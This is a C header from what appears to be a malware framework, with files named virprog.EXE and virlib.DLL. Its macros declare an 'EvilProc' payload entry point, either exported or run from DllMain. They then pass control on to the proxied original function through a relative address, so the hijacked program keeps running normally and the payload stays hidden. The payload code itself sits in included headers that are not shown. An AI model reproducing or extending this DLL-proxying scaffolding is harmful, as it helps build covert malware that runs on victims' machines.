#pragma once

// private headers
#include "../exports.h"
#include "ae.h"
#include "evil_common.h"
#include "pay.h"

#include "spraygen.h" // try it after other includes; if fail, place before


#define EVILPROC_PRE()  XARGSETUP(); __noop

// EXPORT_DECL_ARGS
//     EXPORT_CALL_ARGS      // removed; we're never calling export except EXPORT_DEF_CALL_ARGS
// EXPORT_DEF_CALL_ARGS
// POSTFN_RVA
// POSTFN_DECL_ARGS
// POSTFN_FROMDLL_CALL_ARGS  // was _CALL_ARGS (call meant from dll to dll's proxied fn)
// POSTFN_FROMEXE_CALL_ARGS  // was _DEF_CALL_ARGS (call meant from exe (meaningless) call to dll's proxified fn)
// EVIL_FROM_DLLMAIN
#define WINMAIN_WCHAR

#ifndef _USRDLL // IF building virprog.EXE:

  #ifdef WINMAIN_WCHAR
    #define EVILPROC_DECL()     int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nShowCmd)
  #else
    #define EVILPROC_DECL()     int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
  #endif
  #  define EVILPROC_DEF_CALL() WinMain(0, 0, 0, 0) // debugging

  #ifdef POSTFN_RVA
    // Do postfn call with DEF call args
    #define EVILPROC_POST()   XARGCLEANUP(); return Z(g_hEvil) != NULL ? ((int(WINAPI*)(POSTFN_DECL_ARGS))((DWORD_PTR)Z(g_hEvil) + POSTFN_RVA))(POSTFN_FROMEXE_CALL_ARGS) : 0
  #else
    // No postfn RVA is set
    #define EVILPROC_POST()   XARGCLEANUP(); return Z(g_dwP2Ret)
  #endif


#else // IF building virlib.DLL:


  #ifdef EVIL_FROM_DLLMAIN

    // not using EXPORT_DECL_ARGS, EXPORT_DEF_CALL_ARGS
    #define EVILPROC_DECL()   PVOID WINAPI EvilProc()
    #define EVILPROC_DEF_CALL() EvilProc()

    #ifdef POSTFN_RVA
      #define EVILPROC_POST()   XARGCLEANUP(); return \
                                  ((PVOID(WINAPI*)(POSTFN_DECL_ARGS))((DWORD_PTR)Z(g_hEvil) + POSTFN_RVA))(POSTFN_FROMDLL_CALL_ARGS),\
                                  0 // ???#PostfnFrmLosingReturnValue DllMain should return TRUE, skip what postfn has returned
    #else
      #define EVILPROC_POST()   XARGCLEANUP(); return 0
    #endif

  #else // don't  from main, export it:

    #define EVILPROC_DECL()   PVOID WINAPI EvilProc(EXPORT_DECL_ARGS)
    //#define EVILPROC_DEF_CALL() EvilProc(EXPORT_DEF_CALL_ARGS)

    #ifdef POSTFN_RVA
      #define EVILPROC_POST()   XARGCLEANUP(); return ((PVOID(WINAPI*)(POSTFN_DECL_ARGS))((DWORD_PTR)Z(g_hEvil) + POSTFN_RVA))(POSTFN_FROMDLL_CALL_ARGS)
    #else
      #define EVILPROC_POST()   XARGCLEANUP(); return (PVOID)(Z(g_dwP2Ret))
    #endif

  #endif


#endif // _USRDLL

// ---

EVILPROC_DECL();

